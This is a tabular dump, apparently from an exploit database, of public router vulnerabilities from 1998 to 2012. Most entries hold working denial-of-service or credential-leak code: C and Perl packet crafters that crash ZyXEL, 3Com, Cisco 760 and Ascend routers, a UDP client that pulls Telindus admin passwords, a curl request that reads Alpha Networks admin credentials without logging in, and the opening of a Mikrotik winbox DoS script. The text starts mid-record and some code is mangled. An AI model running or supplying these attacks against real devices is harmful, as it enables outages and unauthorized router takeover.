printf(""\tNumber is the number of packets to send, 5 is the default\n"");
printf(""\nNOTE:  This is based on a bug that used to affect POSIX complient, and SYSV \n\t systems so its nothing new..\n"");
printf(""\nGreets to Bill Gates! How do ya like this one? :-)\n"");
exit(1);
if (argc == 4) num = atoi(argv[3]);
for (i=1;i<=num;i++) {
if ((hp = gethostbyname(argv[1])) == NULL) {
if ((ip->ip_dst.s_addr = inet_addr(argv[1])) == -1) {
fprintf(stderr, ""%s: unknown host\n"", argv[1]);
exit(1);
} else {
bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);
if ((hp2 = gethostbyname(argv[2])) == NULL) {
if ((ip->ip_src.s_addr = inet_addr(argv[2])) == -1) {
fprintf(stderr, ""%s: unknown host\n"", argv[2]);
exit(1);
} else {
bcopy(hp2->h_addr_list[0], &ip->ip_src.s_addr, hp->h_length);
printf(""Sending to %s\n"", inet_ntoa(ip->ip_dst));
ip->ip_v = 4;
ip->ip_hl = sizeof *ip >> 2;
ip->ip_tos = 0;
ip->ip_len = htons(sizeof buf);
ip->ip_id = htons(4321);
ip->ip_off = htons(0);
ip->ip_ttl = 255;
ip->ip_p = 1;
ip->ip_csum = 0;                 /* kernel fills in */
dst.sin_addr = ip->ip_dst;
dst.sin_family = AF_INET;
icmp->type = ICMP_ECHO;
icmp->code = 0;
icmp->checksum = htons(~(ICMP_ECHO << 8));
for (offset = 0; offset < 65536; offset += (sizeof buf - sizeof *ip)) {
ip->ip_off = htons(offset >> 3);
if (offset < 65120)
ip->ip_off |= htons(0x2000);
else
ip->ip_len = htons(418);  /* make total 65538 */
if (sendto(s, buf, sizeof buf, 0, (struct sockaddr *)&dst,
sizeof dst) < 0) {
fprintf(stderr, ""offset %d: "", offset);
perror(""sendto"");
if (offset == 0) {
icmp->type = 0;
icmp->code = 0;
icmp->checksum = 0;
return 0;"
2002-07-17,DoS,Hardware,Kistler Ueli,ZYXEL Prestige 642R Router,Malformed Packet Denial of Service,"source: https://www.securityfocus.com/bid/5034/info
# This is a RafaleX script (Download: www.packx.net)
# Rafale X script
# ---------------
# Action : Make a ZyXEL 642R Prestige Router inaccessible on port 23
// Variables
// Do the stuff...","ZyXEL 642R routers have difficulties handling certain types of malformed packets. In particular, it is possible to deny services by sending a vulnerable router a SYN-ACK packet. To a lesser degree, the router also encounters difficulties when handling SYN-FIN packets. In both instances, some services provided by the router (telnet, FTP and DHCP) will be denied, however, the device will continue to route network traffic. This issue has also been reproduced with other types of malformed packets.
ZyXEL 642R-11 and Prestige 310 routers are reportedly affected by this vulnerability. It is possible that other ZyNOS-based routers are also affected by this vulnerability. ZxXEL 643 ADSL routers do not appear to be prone to this issue.
This issue may be exploited in combination with the vulnerability described in Bugtraq ID 3346.
%name=ZyXEL telnet service DoS
%category=Denial of service
%date=23-05-2002
%rafalemin=0.2
%description=Crash ZyXEL router telnet service with ACK and SYN flag
$done=Target attacked...
!Display=Please wait...
!Sleep 500
PORTDST=23
IPHEADERSIZE=20
ACK=1
SYN=1
!Display=Sending the packet...
!SEND 1 TCP
!Sleep 200
!Display=ACK/SYN Packet sent! ZyXEL telnet service crashed
(V2.50(AJ.6))
!Sleep 1000
!Display=$done"
2002-06-05,Remote,Hardware,rubik,Telindus 1100 Series Router,Administration Password Leak,"// source: https://www.securityfocus.com/bid/4946/info
/* telozarzo.c */
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<netinet/udp.h>
#include<arpa/inet.h>
#include<sys/time.h>
#include<string.h>
#include<stdio.h>
#include<signal.h>
#include<unistd.h>
#include<stdlib.h>
#define BUFFER_SIZE 300","The 1100 series routers are a broadband connectivity solution distributed by Telindus.
Under some circumstances, a vulnerable Telindus router may leak sensitive information. When an attempt to connect to the router is made using the administrative software, the router sends the password to the client in plain text. This packet is sent via UDP.
**The vendor has released firmware version 6.0.27, dated July 2002. Reports suggest that this firmware does not adequately protect against this vulnerability. The firmware is reported to use an encrypted UDP packet when connecting to the router. However, the firmware uses a weak encryption scheme and thus it is easily circumvented by an attacker.
this is a really-stupid bad-written exploit for telindus router (10xx and
11xx series)
bye,
rubik@olografix.org
struct sockaddr sa;
struct sockaddr sf;
struct sockaddr *from;
struct sockaddr_in *p, *d;
int len;
int fd;
int sent,recvd;
unsigned long start_ip;
char pass[32];
char str[10];
FILE *logfile;
struct timeval minutetimeout;
int TIMEOUT;
int numhost=0, numfound=0;
double per;
u_char data2recv[BUFFER_SIZE];
u_char data2sent[62]={
0x19, 0x73, 0x04, 0x17, 0x73, 0x30, 0x00, 0x01,
0x00, 0x01, 0x01, 0x00, 0x01, 0x01, 0x01, 0x02,
0x01, 0x33, 0x01, 0x13, 0x01, 0x16, 0x04, 0x08,
0x04, 0x15, 0x01, 0x0D, 0x01, 0x0E, 0x01, 0x14,
0x40, 0x03, 0x40, 0x04, 0x01, 0x26, 0x01, 0x27,
0x01, 0x28, 0x01, 0x30, 0x01, 0x44, 0x42, 0x05,
0x42, 0x22, 0x04, 0x18, 0xFF, 0xFF, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00
void func_alarm_telindus (int s) {
close(fd);
return;
void exitnow () {
close(fd);
exit(2);
int checktelindus (unsigned long ip) {
int i=0;
char *s;
p=(struct sockaddr_in*)&sa;
p->sin_family=AF_INET;
p->sin_port=htons(9833);
p->sin_addr.s_addr= htonl(ip);
d=(struct sockaddr_in*)&sf;
d->sin_family=AF_INET;
d->sin_port=htons(9833);
d->sin_addr.s_addr=INADDR_ANY;
minutetimeout.tv_sec = TIMEOUT;
minutetimeout.tv_usec = 0;
bzero (data2recv, sizeof (data2recv));
fd=socket(AF_INET,SOCK_DGRAM,0);
bind (fd, (struct sockaddr*)d, sizeof (struct sockaddr));
sent=sendto(fd,&data2sent,62,0,(struct sockaddr*)p,sizeof(struct sockaddr));
signal(SIGALRM, func_alarm_telindus);
alarm(TIMEOUT);
if (recvfrom(fd,data2recv,BUFFER_SIZE,0,from,&len)<=0) {
alarm(0);
signal(SIGALRM,SIG_DFL);
bzero (data2recv, sizeof (data2recv));
return(-1);
s=data2recv;
while (i<5) {
while ((*(s++)) != '\0');  i++;
if (*s == '\0') {
printf (""pw vuota\n"");
} else {
strncpy (pass, ++s, strlen(s) -3 );
printf (""pw: = %s \n"", pass);
alarm(0);
signal(SIGALRM,SIG_DFL);
return (0);
void usage (char *cmd) {
printf (""\n%s ip\n"", cmd);
exit(1);
int main(int argc, char *argv[]) {
if (argc != 2) usage(argv[0]);
start_ip=inet_addr(argv[1]);
signal(SIGINT, exitnow);
signal(SIGTERM, exitnow);
signal(SIGKILL, exitnow);
signal(SIGQUIT, exitnow);
checktelindus (ntohl(start_ip));
return (0);"
2001-12-18,Remote,Hardware,Przemyslaw Frasunek,ZYXEL Prestige 681 SDSL Router,IP Fragment Reassembly,source: https://www.securityfocus.com/bid/3711/info,"Prestige is a product line of DSL routers produced and distributed by Zyxel.
When a Zyxel router receives fragmented packets that after reassembly is greater than 64 kilobytes in length, the router crashes. The router must be power cycled to resume normal operation. This could lead to a remote user denying service to a legitimate user of the router. The router is affected only by fragmented packets received through the DSL interface. Fragmented packets sent through the LAN interface have no affect on the system.
ping -t -l 65500 victim.example.com"
2001-09-21,DoS,Hardware,Sniffer,3Com OfficeConnect DSL Router 812 1.1.7/840 1.1.7,HTTP Port Router Denial of Service,"// source: https://www.securityfocus.com/bid/2721/info
// 3Com OfficeConnect 812/840 ADSL Router Denial of Service (maybe others)
// Proof of concept, soft and hard reset, the security is weak
// Written pour sniffer <sniffer@sniffer.net>
// Fri Sep 21 15:51:35 BRT 2001
// Viva Brazil!
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>","OfficeConnect 812 is a DSL router manufactured by 3Com, and distributed by numerous DSL providers. OfficeConnect 812 is an integrated ADSL router with an onboard 4 port switch.
A problem in the firmware included with this router could allow a Denial of Service. It is possible to reboot the router by connecting to the HTTP daemon, and requesting a long string. The router will power-cycle itself.
This problem makes it possible for a remote user to deny service to legimate users of networks serviced by the router.
void
usage(binary)
char *binary;
fprintf(stderr,""3Com OfficeConnect 812 ADSL Router Denial of Service (%s)\nsniffer <sniffer@sniffer.net>\n\t%s <1 (soft) || 2 (hard)> <remote router>\n"", __FILE__, binary);
int
main(argc, argv)
int argc;
char **argv;
int sockfd;
char senddata[1024];
char hardreset_data[] = {
71,69,84,32,47,103,114,97,112,104,105,99,115,
47,115,109,108,51,99,111,109,37,115,37,115,37,
115,37,115,37,115,37,115,37,115,37,115,37,115,
37,115,37,115,37,115,37,115,37,115,37,115,37,
115,37,115,37,115,37,115,37,115,37,115,37,115,
37,115,37,115,37,115,37,115,37,115,37,115,37,
115,37,115,37,115,37,115,37,115,37,115,37,115,
37,115,37,115,37,115,37,115,37,115,37,115,37,
115,37,115,37,115,37,115,37,115,37,115,37,115,
37,115,37,115,37,115,37,115,37,115,37,115,37,
115,37,115,37,115,37,115,37,115,37,115,37,115,
37,115,37,115,37,115,37,115,32,72,84,84,80,
47,49,46,48,10,10,0 };
char softreset_data[] = {
80,79,83,84,32,47,70,111,114,109,115,47,97,
100,115,108,95,114,101,115,101,116,32,72,84,84,
80,47,49,46,49,10,72,111,115,116,58,32,49,
57,50,46,49,54,56,46,49,46,50,53,52,10,
67,111,110,110,101,99,116,105,111,110,58,32,99,
108,111,115,101,10,67,111,110,116,101,110,116,45,
76,101,110,103,116,104,58,32,49,57,10,10,83,
117,98,109,105,116,61,82,101,115,101,116,37,50,
48,76,105,110,101,10,10,0 };
struct hostent *he;
struct sockaddr_in their_addr;
if( argc != 3 )
usage(argv[0]);
exit(0);
if( atoi(argv[1]) >= 3 || atoi(argv[1]) == 0 )
usage(argv[0]);
exit(0);
if((he=gethostbyname(argv[2])) == NULL)
herror(""gethostbyname"");
exit(1);
their_addr.sin_family = AF_INET;
their_addr.sin_port = htons(80);
their_addr.sin_addr = (*(struct in_addr *)he->h_addr);
bzero(&their_addr.sin_zero, 8);
if ((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1)
perror(""socket"");
exit(1);
if(connect(sockfd, (struct sockaddr *)&their_addr, sizeof(struct sockaddr)) == -1)
perror(""connect"");
exit(1);
else
printf(""connected\n"");
if(atoi(argv[1]) == 1)
strncpy(senddata, softreset_data, strlen(softreset_data));
else if(atoi(argv[1]) == 2)
strncpy(senddata, hardreset_data, strlen(hardreset_data));
if(send(sockfd, senddata, sizeof(senddata), 0) == -1)
perror(""send"");
exit(1);
else
printf(""evil data sent\n.. have a rice day\n"");
close(sockfd);
return(0);"
2012-08-20,WebApps,Hardware,Alberto Ortega,Alpha Networks ADSL2/2+ Wireless Router ASL-26555,Password Disclosure,,"- Title:
Alpha Networks ADSL2/2+ Wireless Router ASL-26555 Remote Administration Password Disclosure
- Author:
Alberto Ortega @a0rtega
alberto[@]pentbox[.]net
- Version:
Tested on firmware version v2.0.0.30B_ES.
Laboratory subject: http://a0rtega.pentbox.net/files/asl-26555-zombie.jpg
- Summary:
Alpha Networks ADSL Wireless Routers have an administration web panel
to manage the device configuration.
To access the panel, the administrator has to visit the IP of the device using
the port 8000 with a web browser. It will prompt for authentication.
$ curl http://192.168.1.1:8000/SETUP/sp_home.htm
<title>401 Not Authorized</title>
<h1>401 Not Authorized</h1>
$ curl -I http://192.168.1.1:8000/SETUP/sp_home.htm
HTTP/1.1 401 Not Authorized
Server: LocalAccess
Date: Thu, 16 Aug 2012 18:23:08 GMT
WWW-Authenticate: Basic realm=""ASL-26555""
- The vulnerability:
If we investigate the directory /APIS/ in the same web server we will have a fully usable
API to grab information from the device.
This API doesn't seem to be documented anywhere, quite weird (backdoor?).
Also, this API doesn't require authentication and grant us administrator access.
The implemented calls to the API are:
returnWifiJSON.htm              returnInterfacesJSON.txt
returnWelcomeInfoJSON.htm       returnFirewallLevelJSON.txt
returnUsbJSON.htm               returnFirewallJSON.txt
returnServicesJSON.txt          returnDhcpList.htm
returnPasswordJSON.htm          returnDevicesJSON.htm
returnLoginStatusJSON.htm       returnApplicationsListJSON.htm
returnLoginJSON.txt             returnApplicationsJSON.htm
returnJSON.htm                  returnApplicationJSON.txt
returnIpJSON.txt                returnInternetJSON.htm
We can read all the configuration from the device without authentication. In addition, we have
a call named returnJSON.htm that returns us the credentials of the administrator user:
$ curl -I http://192.168.1.1:8000/APIS/returnJSON.htm
HTTP/1.1 200 OK
Server: LocalAccess
Date: Thu, 16 Aug 2012 18:29:50 GMT
Transfer-Encoding: chunked
Content-Type: text/html
$ curl http://192.168.1.1:8000/APIS/returnJSON.htm
""RETURN"":{
""success"": true,
""errorDescription"": ""ERROR_GENERAL""
""USER"":{
""USERNAME"": ""admin"",
""PASSWORD"": ""adm1n_passw0rd_exposed""
This credentials can be used to log into the web panel with the administrator account.
- Mitigation:
The only possible mitigation is to drop access to everyone from the outside
with a network level blocking configuration.
This can be done in the Advanced configuration of the device.
You can also turn off the web panel, but you won't be able to manage the device."
1990-05-19,Remote,Hardware,Dimuthu Parussalla,Intel Corporation Express 8100 ISDN Router,Fragmented ICMP,source: https://www.securityfocus.com/bid/1228/info,"The Intel Express 8100 and possibly 8200 ISDN routers can be remotely crashed by sending fragmented or oversized ICMP packets.
Using libnet and isic-0.05:
icmpsic -s 127.0.0.1,23 -d <target.router.ip.address> -F 100"
2000-05-17,DoS,Hardware,cassius,Cayman 3220-H DSL Router 1.0/GatorSurf 5.3,Denial of Service,source: https://www.securityfocus.com/bid/1219/info,"Large usernames or passwords sent to the router's HTTP interface restart the router. Router log will show ""restart not in response to admin command""
Open the router interface with your browser.
Username: ......................... (x79 +)
After the router restarts, you can hit refresh on your browser to take it down again.
A simple script or program could be written to keep the router down indefinately."
1999-03-11,DoS,Hardware,Tiz.Telesup,Cisco 7xx Series Router,Denial of Service,"// source: https://www.securityfocus.com/bid/1211/info
/* Cisco 760 Series Connection Overflow
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <net/if.h>
#include <netinet/in.h>
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
/* first allocate a socket */","Opening approximately 98 connections on port 23 will cause Cisco 760 Series Routers to self reboot. Continuously repeating this action will result in a denial of service attack.
* Written by: Tiz.Telesup
* Affected Systems: Routers Cisco 760 Series, I havn't tested anymore
* Tested on: FreeBSD 4.0 and Linux RedHat 6.0
int     net_connect (struct sockaddr_in *cs, char *server,
unsigned short int port, char *sourceip,
unsigned short int sourceport, int sec);
void    net_write (int fd, const char *str, ...);
unsigned long int       net_resolve (char *host);
void
usage (void)
printf (""usage: ./cisco host times\n"");
exit (EXIT_FAILURE);
int
main (int argc, char *argv[])
char                    host[256];
int                     port,times,count,sd = 0;
int                     m = 0;
struct sockaddr_in      cs;
printf (""Cisco 760 series Connection Overflow.\n"");
printf (""-------------------------------------\n"");
if (argc < 3)
usage();
strcpy (host, argv[1]);
times=atoi (argv[2]);
if ((times < 1) || (times > 10000)) /*Maximum number of connections*/
usage();
port =23; /* This might be changed to the telnet port of the router*/
printf (""Host: %s Times: %d\n"", host, times);
for (count=0;count<times;count++){
printf (""Connecting... Connection number %d \n"",count);
fflush (stdout);
sd = net_connect (&cs, host, port, NULL, 0, 30);
if (sd < 1) {
printf (""failed!\n"");
exit (EXIT_FAILURE);
net_write (sd, ""AAAA\n\n"");
exit (EXIT_SUCCESS);
int
net_connect (struct sockaddr_in *cs, char *server, unsigned short int port, char *sourceip,
unsigned short int sourceport, int sec)
int             n, len, error, flags;
int             fd;
struct timeval  tv;
fd_set          rset, wset;
cs->sin_family = AF_INET;
cs->sin_port = htons (port);
fd = socket (cs->sin_family, SOCK_STREAM, 0);
if (fd == -1)
return (-1);
if (!(cs->sin_addr.s_addr = net_resolve (server))) {
close (fd);
return (-1);
flags = fcntl (fd, F_GETFL, 0);
if (flags == -1) {
close (fd);
return (-1);
n = fcntl (fd, F_SETFL, flags | O_NONBLOCK);
if (n == -1) {
close (fd);
return (-1);
error = 0;
n = connect (fd, (struct sockaddr *) cs, sizeof (struct sockaddr_in));
if (n < 0) {
if (errno != EINPROGRESS) {
close (fd);
return (-1);
if (n == 0)
goto done;
FD_ZERO(&rset);
FD_ZERO(&wset);
FD_SET(fd, &rset);
FD_SET(fd, &wset);
tv.tv_sec = sec;
tv.tv_usec = 0;
n = select(fd + 1, &rset, &wset, NULL, &tv);
if (n == 0) {
close(fd);
errno = ETIMEDOUT;
return (-1);
if (n == -1)
return (-1);
if (FD_ISSET(fd, &rset) || FD_ISSET(fd, &wset)) {
if (FD_ISSET(fd, &rset) && FD_ISSET(fd, &wset)) {
len = sizeof(error);
if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {
errno = ETIMEDOUT;
return (-1);
if (error == 0) {
goto done;
} else {
errno = error;
return (-1);
} else
return (-1);
done:
n = fcntl(fd, F_SETFL, flags);
if (n == -1)
return (-1);
return (fd);
unsigned long int
net_resolve (char *host)
long            i;
struct hostent  *he;
i = inet_addr(host);
if (i == -1) {
he = gethostbyname(host);
if (he == NULL) {
return (0);
} else {
return (*(unsigned long *) he->h_addr);
return (i);
void
net_write (int fd, const char *str, ...)
char    tmp[8192];
va_list vl;
int     i;
va_start(vl, str);
memset(tmp, 0, sizeof(tmp));
i = vsnprintf(tmp, sizeof(tmp), str, vl);
va_end(vl);
send(fd, tmp, i, 0);
return;"
2000-05-16,Remote,Hardware,Stephen Friedl,Netopia R-series Routers 4.6.2,Modifying SNMP Tables,"source: https://www.securityfocus.com/bid/1177/info
# set snmp community RO wookie
# set snmp community RW wookie","All R-series platforms with firmware between 4.3.8 and 4.6.2 (inclusive) allow users who already have access to the router to modify SNMP tables which they should not be able to access. The router has a command-line mode that is reached by typing control-N after the user has passed the intial login test. At the ""#"" prompt one can then do most management of the device. This includes the setting of SNMP community strings in spite of the limitation imposed by the administrator.
The following devices are confirmed as vulnerable:
R2020 Dual Analog Router
R3100 ISDN Router
R3100-I ISDL Router
R3100-T IDSL router for Covad
R3232-I IDSL 4-IMUX router
R5100 Serial router
R5200 DDS router
R5220 DDS router w/ V.90 backup
R5300 T1 router
R5320 T1 router w/ V.90 backup
R5331 T1 router w/ ISDN backup
R7100-C SDSL router
R7120 SDSL Router w/int V.90
R7131 SDSL router w/int ISDN
R7171 SDSL 2x IMUX router
R7200-T SDSL router for Covad
R7220 SDSL router w/int.V.90
R7231 SDSL router w/int ISDN
R9100 Ethernet-to-ethernet Router
or
The exploit can only be attempted by those with existing access login to the device."
1998-03-17,Remote,Hardware,Rootshell,Lucent Ascend MAX 5.0/Pipeline 6.0/TNT 1.0/2.0 Router,MAX UDP Port 9 (2),"source: https://www.securityfocus.com/bid/714/info
#!/usr/bin/perl
# Ascend Kill II - perl version
# (C) 1998 Rootshell - http://www.rootshell.com/ - <info@rootshell.com>
# Released: 3/17/98
# Thanks to Secure Networks.  See SNI-26: Ascend Router Security Issues
# (http://www.secnet.com/sni-advisories/sni-26.ascendrouter.advisory.html)
#  NOTE: This program is NOT to be used for malicous purposes.  This is
#        intenteded for educational purposes only.  By using this program
#        you agree to use this for lawfull purposes ONLY.","Certain versions of Ascends (Lucent) router software listen on port 9 (UDP Discard). Ascend provides configuration tools for MAX and Pipeline routers that locate locally installed routers by broadcasting a specially formatted packet to UDP port 9. An attacker can send a similar but malformed packet to the same port that will cause MAX and Pipeline routers running certain software versions to crash.
use Socket;
require ""getopts.pl"";
sub AF_INET {2;}
sub SOCK_DGRAM {2;}
sub ascend_kill {
$remotehost = shift(@_);
chop($hostname = `hostname`);
$port = 9;
$SIG{'INT'} = 'dokill';
$sockaddr = 'S n a4 x8';
($pname, $aliases, $proto) = getprotobyname('tcp');
($pname, $aliases, $port) = getservbyname($port, 'tcp')
unless $port =~ /^\d+$/;
($pname, $aliases, $ptype, $len, $thisaddr) =
gethostbyname($hostname);
$this = pack($sockaddr, AF_INET, 0, $thisaddr);
($pname, $aliases, $ptype, $len, $thataddr) = gethostbyname($remotehost);
$that = pack($sockaddr, AF_INET, $port, $thataddr);
socket(S, &AF_INET, &SOCK_DGRAM, 0);
$msg = pack(""c64"",
0x00, 0x00, 0x07, 0xa2, 0x08, 0x12, 0xcc, 0xfd, 0xa4, 0x81, 0x00, 0x00,
0x00, 0x00, 0x12, 0x34, 0x56, 0x78, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0x00, 0x4e, 0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0x4e,
0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0xff, 0x50, 0x41, 0x53, 0x53,
0x57, 0x4f, 0x52, 0x44, 0x50, 0x41, 0x53, 0x53, 0x57, 0x4f, 0x52, 0x44,
0x50, 0x41, 0x53, 0x53);
for ($i=0; $i<500; $i++) {
$msg .= pack(""c1"", 0xff);
send(S,$msg,0,$that) || die ""send:$!"";
if ($ARGV[0] eq '') {
print ""usage: akill2.pl <remote_host>\n"";
exit;
&ascend_kill($ARGV[0]);"
1998-03-16,Remote,Hardware,Rootshell,Lucent Ascend MAX 5.0/Pipeline 6.0/TNT 1.0/2.0 Router,MAX UDP Port 9 (1),"source: https://www.securityfocus.com/bid/714/info
/* Update, 3/20/98: Ascend has released 5.0Ap46 which corrects this bug.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <linux/udp.h>
#include <netdb.h>
#define err(x) { fprintf(stderr, x); exit(1); }
#define errs(x, y) { fprintf(stderr, x, y); exit(1); }
/* This magic packet was taken from the Java Configurator */
/* Append random garbage to the packet, without this the router","Certain versions of Ascends (Lucent) router software listen on port 9 (UDP Discard). Ascend provides configuration tools for MAX and Pipeline routers that locate locally installed routers by broadcasting a specially formatted packet to UDP port 9. An attacker can send a similar but malformed packet to the same port that will cause MAX and Pipeline routers running certain software versions to crash.
* see ftp.ascend.com.
* Ascend Kill II - C version
* (C) 1998 Rootshell - http://www.rootshell.com/
* Released: 3/16/98
* Thanks to Secure Networks.  See SNI-26: Ascend Router Security Issues
* (http://www.secnet.com/sni-advisories/sni-26.ascendrouter.advisory.html)
* Sends a specially constructed UDP packet on the discard port (9)
* which cause Ascend routers to reboot.  (Warning! Ascend routers will
* process these if they are broadcast packets.)
* Compiled under RedHat 5.0 with glibc.
* NOTE: This program is NOT to be used for malicous purposes.  This is
*       intenteded for educational purposes only.  By using this program
*       you agree to use this for lawfull purposes ONLY.
* It is worth mentioning that Ascend has known about this bug for quite
* some time.
* Fix:
* Filter inbound UDP on port 9.
char ascend_data[] =
0x00, 0x00, 0x07, 0xa2, 0x08, 0x12, 0xcc, 0xfd, 0xa4, 0x81, 0x00, 0x00,
0x00, 0x00, 0x12, 0x34, 0x56, 0x78, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0x00, 0x4e, 0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0x4e,
0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0xff, 0x50, 0x41, 0x53, 0x53,
0x57, 0x4f, 0x52, 0x44, 0x50, 0x41, 0x53, 0x53, 0x57, 0x4f, 0x52, 0x44,
0x50, 0x41, 0x53, 0x53};
unsigned short
in_cksum (addr, len)
u_short *addr;
int len;
register int nleft = len;
register u_short *w = addr;
register int sum = 0;
u_short answer = 0;
while (nleft > 1)
sum += *w++;
nleft -= 2;
if (nleft == 1)
*(u_char *) (&answer) = *(u_char *) w;
sum += answer;
sum = (sum >> 16) + (sum & 0xffff);
sum += (sum >> 16);
answer = ~sum;
return (answer);
int
sendpkt_udp (sin, s, data, datalen, saddr, daddr, sport, dport)
struct sockaddr_in *sin;
unsigned short int s, datalen, sport, dport;
unsigned long int saddr, daddr;
char *data;
struct iphdr ip;
struct udphdr udp;
static char packet[8192];
char crashme[500];
int i;
ip.ihl = 5;
ip.version = 4;
ip.tos = rand () % 100;;
ip.tot_len = htons (28 + datalen);
ip.id = htons (31337 + (rand () % 100));
ip.frag_off = 0;
ip.ttl = 255;
ip.protocol = IPPROTO_UDP;
ip.check = 0;
ip.saddr = saddr;
ip.daddr = daddr;
ip.check = in_cksum ((char *) &ip, sizeof (ip));
udp.source = htons (sport);
udp.dest = htons (dport);
udp.len = htons (8 + datalen);
udp.check = (short) 0;
memcpy (packet, (char *) &ip, sizeof (ip));
memcpy (packet + sizeof (ip), (char *) &udp, sizeof (udp));
memcpy (packet + sizeof (ip) + sizeof (udp), (char *) data, datalen);
will think this is a valid probe packet and reply. */
for (i = 0; i < 500; i++)
crashme[i] = rand () % 255;
memcpy (packet + sizeof (ip) + sizeof (udp) + datalen, crashme, 500);
return (sendto (s, packet, sizeof (ip) + sizeof (udp) + datalen + 500, 0,
(struct sockaddr *) sin, sizeof (struct sockaddr_in)));
unsigned int
lookup (host)
char *host;
unsigned int addr;
struct hostent *he;
addr = inet_addr (host);
if (addr == -1)
he = gethostbyname (host);
if ((he == NULL) || (he->h_name == NULL) || (he->h_addr_list == NULL))
return 0;
bcopy (*(he->h_addr_list), &(addr), sizeof (he->h_addr_list));
return (addr);
void
main (argc, argv)
int argc;
char **argv;
unsigned int saddr, daddr;
struct sockaddr_in sin;
int s, i;
if (argc != 3)
errs (""Usage: %s <source_addr> <dest_addr>\n"", argv[0]);
if ((s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
err (""Unable to open raw socket.\n"");
if (!(saddr = lookup (argv[1])))
err (""Unable to lookup source address.\n"");
if (!(daddr = lookup (argv[2])))
err (""Unable to lookup destination address.\n"");
sin.sin_family = AF_INET;
sin.sin_port = 9;
sin.sin_addr.s_addr = daddr;
if ((sendpkt_udp (&sin, s, &ascend_data, sizeof (ascend_data), saddr, daddr, 9, 9)) == -1)
perror (""sendpkt_udp"");
err (""Error sending the UDP packet.\n"");"
2012-05-11,WebApps,Hardware,Avinash Tangirala,Belkin N150 Wireless Router,Password Disclosure,#NAME?,
2012-05-01,DoS,Hardware,PoURaN,Mikrotik Router,Denial of Service,"#!/usr/bin/python
# Exploit Title: Mikrotik Router Remote Denial Of Service attack
# Date: 19/4/2012
# Author: PoURaN @ 133tsec.com
# Software Link: http://www.mikrotik.com
# Version: All mikrotik routers with winbox service enabled are affected (still a 0day 30/5/2012)
# Tested on: Mikrotis RouterOS 2.9.6 up to 5.15
#  Vulnerability Description
# ===========================
# DETAILS & PoC VIDEO : http://www.133tsec.com/2012/04/30/0day-ddos-mikrotik-server-side-ddos-attack/
# The denial of service, happens on mikrotik router's winbox service when
# the attacker is requesting continuesly a part of a .dll/plugin file, so the service
# becomes unstable causing every remote clients (with winbox) to disconnect
# and denies to accept any further connections. That happens for about 5 minutes. After
# the 5 minutes, winbox is stable again, being able to accept new connections.
# If you send the malicious packet in a loop (requesting  part of a file right after
# the service becoming available again) then you result in a 100% denial of winbox service.
# While the winbox service is unstable and in a denial to serve state, it raises router's CPU 100%
# and other actions. The ""other actions"" depends on the router version and on the hardware.
# For example on Mikrotik Router v3.30 there was a LAN corruption, BGP fail, whole router failure
# => Mikrotik Router v2.9.6 there was a BGP failure
#=> Mikrotik Router v4.13 unstable wifi links
#=> Mikrotik Router v5.14/5.15 rarely stacking
#=>>> Behaviour may vary most times, but ALL will have CPU 100% . Most routers loose BGP after long time attack <<<=
#  The exploit
# =============
# This is a vulnerability in winbox service, exploiting the fact that winbox lets you download files/plugins
# that winbox client needs to control the server, and generally lets you gain basic infos about the service BEFORE
# user login!
# Sending requests specially crafted for the winbox service, can cause a 100% denial of winbox service (router side).
# This script, offers you the possibility to download any of the dlls that can be downloaded from the router one-by-one
# or alltogether! (look usage for more info) .. The file must be contained in the router's dll index.
# The dlls downloaded, are in the format of the winbox service.. Meaning that they are compressed with gzip and they
# have 0xFFFF bytes every 0x101 bytes (the format that winbox client is expecting the files)
# These DLLs can be used by the ""Winbox remote code execution"" exploit script ;)
#  Usage
# =======
# Use the script as described below:
# 1. You can download ALL the files of the router's dll index using the following command:
#python mkDl.py 10.0.0.1 * 1
#the ""1"" in the end, is the speed.. ""Speed"" is a factor I added, so the script delays a bit while receiving
#information from the server. It is a MUST for remote routers when they are in long distance (many hops) to use
#a slower speed ( 9 for example ).
#Also in the beginning of the dlls file list, script shows you the router's version (provided by router's index)
# 2. You can download a specific .dll file from the remote router.
#python mkDl.py 10.67.162.1 roteros.dll 1
#In this example i download roteros.dll (which is the biggest and main plugin) with a speed factor of 1 (very fast)
#Because roteros and 1-2 other files are big, you have to request them in different part (parts of 64k each)
#That is a restriction of winbox communication protocol.
#If you don't know which file to request, make a ""*"" request first (1st usage example), see the dlls list, and press ctrl-c
#to stop the script.
# 3. You can cause a Denial Of Service to the remote router.. Means denial in winbox service or more (read above for more)
#python mkDl.py 10.67.162.1 DoS
#This command starts requesting from router's winbox service the 1st part of roteros.dll looping the request
#and causing DoS to the router. The script is requesting the file till the router stops responding to the port (8291)
#Then it waits till the service is up again (using some exception handling), then it requests again till the remote
#service is down again etc etc... The requests lasts for about 2 seconds, and the router is not responding for about
#5 minutes as far as i have seen from my tests in different routeros versions.
#<> Greetz to mbarb, dennis, andreas, awmn and all mighty researchers out there! keep walking guys <>
########################################### SCRIPT BODY STARTS HERE ###########################################","import socket, sys, os, struct, random, time
def InitConnection(mikrotikIP, speed):
